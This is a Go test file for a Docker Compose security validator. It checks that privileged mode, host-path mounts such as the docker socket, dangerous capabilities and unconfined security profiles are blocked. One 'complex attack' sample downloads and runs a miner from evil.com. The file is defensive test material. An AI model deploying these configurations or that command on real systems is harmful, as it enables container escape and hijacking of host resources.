package validation

import (
	"strings"
	"testing"
)

func TestValidateComposeSecurity_Privileged(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
		errMsg    string
	}{
		{
			name: "privileged mode blocked",
			compose: `
services:
  malicious:
    image: alpine
    privileged: true
`,
			shouldErr: true,
			errMsg:    "privileged mode is not allowed",
		},
		{
			name: "privileged false allowed",
			compose: `
services:
  safe:
    image: alpine
    privileged: false
`,
			shouldErr: false,
		},
		{
			name: "no privileged field allowed",
			compose: `
services:
  safe:
    image: alpine
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr {
				if err == nil {
					t.Errorf("expected error but got none")
				} else if tt.errMsg != "" && !contains(err.Error(), tt.errMsg) {
					t.Errorf("expected error containing %q, got %q", tt.errMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("expected no error but got: %v", err)
				}
			}
		})
	}
}

func TestValidateComposeSecurity_DangerousVolumes(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
		errMsg    string
	}{
		{
			name: "docker socket mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
`,
			shouldErr: true,
			errMsg:    "docker.sock",
		},
		{
			name: "root filesystem mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /:/host
`,
			shouldErr: true,
			errMsg:    "mounting \"/\"",
		},
		{
			name: "proc mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /proc:/proc
`,
			shouldErr: true,
			errMsg:    "/proc",
		},
		{
			name: "sys mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /sys:/sys
`,
			shouldErr: true,
			errMsg:    "/sys",
		},
		{
			name: "dev mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /dev:/dev
`,
			shouldErr: true,
			errMsg:    "/dev",
		},
		{
			name: "etc mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /etc:/etc
`,
			shouldErr: true,
			errMsg:    "/etc",
		},
		{
			name: "root home mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /root:/root
`,
			shouldErr: true,
			errMsg:    "/root",
		},
		{
			name: "home directory mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /home/user/.ssh:/ssh
`,
			shouldErr: true,
			errMsg:    "/home",
		},
		{
			name: "docker lib mount blocked",
			compose: `
services:
  malicious:
    image: alpine
    volumes:
      - /var/lib/docker:/docker
`,
			shouldErr: true,
			errMsg:    "/var/lib/docker",
		},
		{
			name: "safe data volume allowed",
			compose: `
services:
  safe:
    image: alpine
    volumes:
      - /data/myapp:/app/data
`,
			shouldErr: false,
		},
		{
			name: "safe mnt volume allowed",
			compose: `
services:
  safe:
    image: alpine
    volumes:
      - /mnt/storage:/storage
`,
			shouldErr: false,
		},
		{
			name: "safe opt volume allowed",
			compose: `
services:
  safe:
    image: alpine
    volumes:
      - /opt/myapp:/app
`,
			shouldErr: false,
		},
		{
			name: "named volume allowed",
			compose: `
services:
  safe:
    image: alpine
    volumes:
      - mydata:/data
volumes:
  mydata:
`,
			shouldErr: false,
		},
		{
			name: "relative path volume allowed",
			compose: `
services:
  safe:
    image: alpine
    volumes:
      - ./data:/data
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr {
				if err == nil {
					t.Errorf("expected error but got none")
				} else if tt.errMsg != "" && !contains(err.Error(), tt.errMsg) {
					t.Errorf("expected error containing %q, got %q", tt.errMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("expected no error but got: %v", err)
				}
			}
		})
	}
}

func TestValidateComposeSecurity_Devices(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
	}{
		{
			name: "device access blocked",
			compose: `
services:
  malicious:
    image: alpine
    devices:
      - /dev/sda:/dev/sda
`,
			shouldErr: true,
		},
		{
			name: "no devices allowed",
			compose: `
services:
  safe:
    image: alpine
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error but got none")
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("expected no error but got: %v", err)
			}
		})
	}
}

func TestValidateComposeSecurity_NetworkMode(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
		errMsg    string
	}{
		{
			name: "host network mode blocked",
			compose: `
services:
  malicious:
    image: alpine
    network_mode: host
`,
			shouldErr: true,
			errMsg:    "network_mode 'host'",
		},
		{
			name: "bridge network mode allowed",
			compose: `
services:
  safe:
    image: alpine
    network_mode: bridge
`,
			shouldErr: false,
		},
		{
			name: "no network mode allowed",
			compose: `
services:
  safe:
    image: alpine
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr {
				if err == nil {
					t.Errorf("expected error but got none")
				} else if tt.errMsg != "" && !contains(err.Error(), tt.errMsg) {
					t.Errorf("expected error containing %q, got %q", tt.errMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("expected no error but got: %v", err)
				}
			}
		})
	}
}

func TestValidateComposeSecurity_PidMode(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
	}{
		{
			name: "host pid mode blocked",
			compose: `
services:
  malicious:
    image: alpine
    pid: host
`,
			shouldErr: true,
		},
		{
			name: "container pid mode allowed",
			compose: `
services:
  safe:
    image: alpine
    pid: container:other
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error but got none")
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("expected no error but got: %v", err)
			}
		})
	}
}

func TestValidateComposeSecurity_IpcMode(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
	}{
		{
			name: "host ipc mode blocked",
			compose: `
services:
  malicious:
    image: alpine
    ipc: host
`,
			shouldErr: true,
		},
		{
			name: "shareable ipc mode allowed",
			compose: `
services:
  safe:
    image: alpine
    ipc: shareable
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error but got none")
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("expected no error but got: %v", err)
			}
		})
	}
}

func TestValidateComposeSecurity_Capabilities(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
		errMsg    string
	}{
		{
			name: "SYS_ADMIN capability blocked",
			compose: `
services:
  malicious:
    image: alpine
    cap_add:
      - SYS_ADMIN
`,
			shouldErr: true,
			errMsg:    "SYS_ADMIN",
		},
		{
			name: "SYS_MODULE capability blocked",
			compose: `
services:
  malicious:
    image: alpine
    cap_add:
      - SYS_MODULE
`,
			shouldErr: true,
			errMsg:    "SYS_MODULE",
		},
		{
			name: "NET_ADMIN capability blocked",
			compose: `
services:
  malicious:
    image: alpine
    cap_add:
      - NET_ADMIN
`,
			shouldErr: true,
			errMsg:    "NET_ADMIN",
		},
		{
			name: "ALL capabilities blocked",
			compose: `
services:
  malicious:
    image: alpine
    cap_add:
      - ALL
`,
			shouldErr: true,
			errMsg:    "ALL",
		},
		{
			name: "CAP_ prefix handled",
			compose: `
services:
  malicious:
    image: alpine
    cap_add:
      - CAP_SYS_ADMIN
`,
			shouldErr: true,
			errMsg:    "SYS_ADMIN",
		},
		{
			name: "safe capabilities allowed",
			compose: `
services:
  safe:
    image: alpine
    cap_add:
      - NET_BIND_SERVICE
`,
			shouldErr: false,
		},
		{
			name: "cap_drop allowed",
			compose: `
services:
  safe:
    image: alpine
    cap_drop:
      - ALL
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr {
				if err == nil {
					t.Errorf("expected error but got none")
				} else if tt.errMsg != "" && !contains(err.Error(), tt.errMsg) {
					t.Errorf("expected error containing %q, got %q", tt.errMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("expected no error but got: %v", err)
				}
			}
		})
	}
}

func TestValidateComposeSecurity_SecurityOpt(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
		errMsg    string
	}{
		{
			name: "apparmor unconfined blocked",
			compose: `
services:
  malicious:
    image: alpine
    security_opt:
      - apparmor=unconfined
`,
			shouldErr: true,
			errMsg:    "AppArmor",
		},
		{
			name: "seccomp unconfined blocked",
			compose: `
services:
  malicious:
    image: alpine
    security_opt:
      - seccomp=unconfined
`,
			shouldErr: true,
			errMsg:    "seccomp",
		},
		{
			name: "label disable blocked",
			compose: `
services:
  malicious:
    image: alpine
    security_opt:
      - label=disable
`,
			shouldErr: true,
			errMsg:    "SELinux",
		},
		{
			name: "no-new-privileges false blocked",
			compose: `
services:
  malicious:
    image: alpine
    security_opt:
      - no-new-privileges=false
`,
			shouldErr: true,
			errMsg:    "no-new-privileges",
		},
		{
			name: "safe security opt allowed",
			compose: `
services:
  safe:
    image: alpine
    security_opt:
      - no-new-privileges=true
`,
			shouldErr: false,
		},
		{
			name: "custom apparmor profile allowed",
			compose: `
services:
  safe:
    image: alpine
    security_opt:
      - apparmor=docker-default
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr {
				if err == nil {
					t.Errorf("expected error but got none")
				} else if tt.errMsg != "" && !contains(err.Error(), tt.errMsg) {
					t.Errorf("expected error containing %q, got %q", tt.errMsg, err.Error())
				}
			} else {
				if err != nil {
					t.Errorf("expected no error but got: %v", err)
				}
			}
		})
	}
}

func TestValidateComposeSecurity_CgroupParent(t *testing.T) {
	tests := []struct {
		name      string
		compose   string
		shouldErr bool
	}{
		{
			name: "custom cgroup parent blocked",
			compose: `
services:
  malicious:
    image: alpine
    cgroup_parent: /custom/cgroup
`,
			shouldErr: true,
		},
		{
			name: "no cgroup parent allowed",
			compose: `
services:
  safe:
    image: alpine
`,
			shouldErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error but got none")
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("expected no error but got: %v", err)
			}
		})
	}
}

func TestValidateComposeSecurity_ComplexAttack(t *testing.T) {
	// Test a realistic attack scenario combining multiple techniques
	maliciousCompose := `
services:
  cryptominer:
    image: alpine
    command: sh -c "wget http://evil.com/miner && chmod +x miner && ./miner"
    restart: unless-stopped
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    privileged: true
    network_mode: host
    cap_add:
      - SYS_ADMIN
      - NET_ADMIN
`

	err := ValidateComposeContent(maliciousCompose)
	if err == nil {
		t.Errorf("expected malicious compose to be blocked but it was allowed")
	}
}

func TestValidateComposeSecurity_LegitimateUseCases(t *testing.T) {
	tests := []struct {
		name    string
		compose string
	}{
		{
			name: "web application",
			compose: `
services:
  web:
    image: nginx:alpine
    ports:
      - "8080:80"
    volumes:
      - ./html:/usr/share/nginx/html:ro
`,
		},
		{
			name: "database with named volume",
			compose: `
services:
  db:
    image: postgres:15
    environment:
      POSTGRES_PASSWORD: secret
    volumes:
      - pgdata:/var/lib/postgresql/data
volumes:
  pgdata:
`,
		},
		{
			name: "app with safe data directory",
			compose: `
services:
  app:
    image: myapp:latest
    volumes:
      - /data/myapp:/app/data
      - /mnt/backup:/backup
`,
		},
		{
			name: "app with tmpfs for cache",
			compose: `
services:
  app:
    image: myapp:latest
    tmpfs:
      - /tmp
      - /var/cache
`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateComposeContent(tt.compose)
			if err != nil {
				t.Errorf("legitimate use case blocked: %v", err)
			}
		})
	}
}

func TestValidateVolumeSecurity(t *testing.T) {
	tests := []struct {
		name        string
		serviceName string
		volumeSpec  string
		shouldErr   bool
	}{
		{"docker socket", "svc", "/var/run/docker.sock:/var/run/docker.sock", true},
		{"root fs", "svc", "/:/host", true},
		{"proc", "svc", "/proc:/proc", true},
		{"sys", "svc", "/sys:/sys", true},
		{"dev", "svc", "/dev:/dev", true},
		{"etc", "svc", "/etc:/etc:ro", true},
		{"root home", "svc", "/root/.ssh:/ssh", true},
		{"user home", "svc", "/home/user:/data", true},
		{"docker lib", "svc", "/var/lib/docker:/docker", true},
		{"safe data", "svc", "/data/app:/app", false},
		{"safe mnt", "svc", "/mnt/storage:/storage", false},
		{"safe opt", "svc", "/opt/myapp:/app", false},
		{"named volume", "svc", "mydata:/data", false},
		{"relative path", "svc", "./data:/data", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateVolumeSecurity(tt.serviceName, tt.volumeSpec)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for %q but got none", tt.volumeSpec)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("expected no error for %q but got: %v", tt.volumeSpec, err)
			}
		})
	}
}

func TestValidateCapabilities(t *testing.T) {
	tests := []struct {
		name         string
		capabilities []string
		shouldErr    bool
	}{
		{"SYS_ADMIN", []string{"SYS_ADMIN"}, true},
		{"CAP_SYS_ADMIN", []string{"CAP_SYS_ADMIN"}, true},
		{"SYS_MODULE", []string{"SYS_MODULE"}, true},
		{"NET_ADMIN", []string{"NET_ADMIN"}, true},
		{"SYS_PTRACE", []string{"SYS_PTRACE"}, true},
		{"ALL", []string{"ALL"}, true},
		{"multiple dangerous", []string{"NET_BIND_SERVICE", "SYS_ADMIN"}, true},
		{"NET_BIND_SERVICE", []string{"NET_BIND_SERVICE"}, false},
		{"CHOWN", []string{"CHOWN"}, false},
		{"SETUID", []string{"SETUID"}, false},
		{"empty", []string{}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateCapabilities("test-service", tt.capabilities)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for capabilities %v but got none", tt.capabilities)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("expected no error for capabilities %v but got: %v", tt.capabilities, err)
			}
		})
	}
}

func TestValidateSecurityOpt(t *testing.T) {
	tests := []struct {
		name        string
		securityOpt []string
		shouldErr   bool
	}{
		{"apparmor unconfined", []string{"apparmor=unconfined"}, true},
		{"apparmor unconfined colon", []string{"apparmor:unconfined"}, true},
		{"seccomp unconfined", []string{"seccomp=unconfined"}, true},
		{"label disable", []string{"label=disable"}, true},
		{"no-new-privileges false", []string{"no-new-privileges=false"}, true},
		{"apparmor custom profile", []string{"apparmor=docker-default"}, false},
		{"no-new-privileges true", []string{"no-new-privileges=true"}, false},
		{"seccomp custom profile", []string{"seccomp=/path/to/profile.json"}, false},
		{"empty", []string{}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateSecurityOpt("test-service", tt.securityOpt)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for security_opt %v but got none", tt.securityOpt)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("expected no error for security_opt %v but got: %v", tt.securityOpt, err)
			}
		})
	}
}

func TestValidateTmpfsSecurity(t *testing.T) {
	tests := []struct {
		name       string
		tmpfsSpec  string
		shouldErr  bool
	}{
		{"etc mount", "/etc", true},
		{"root mount", "/root", true},
		{"proc mount", "/proc", true},
		{"sys mount", "/sys", true},
		{"dev mount", "/dev", true},
		{"tmp mount", "/tmp", false},
		{"var cache mount", "/var/cache", false},
		{"app tmp mount", "/app/tmp", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateTmpfsSecurity("test-service", tt.tmpfsSpec)
			if tt.shouldErr && err == nil {
				t.Errorf("expected error for tmpfs %q but got none", tt.tmpfsSpec)
			}
			if !tt.shouldErr && err != nil {
				t.Errorf("expected no error for tmpfs %q but got: %v", tt.tmpfsSpec, err)
			}
		})
	}
}

// Helper function to check if a string contains a substring
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(substr) == 0 || 
		(len(s) > 0 && len(substr) > 0 && strings.Contains(s, substr)))
}
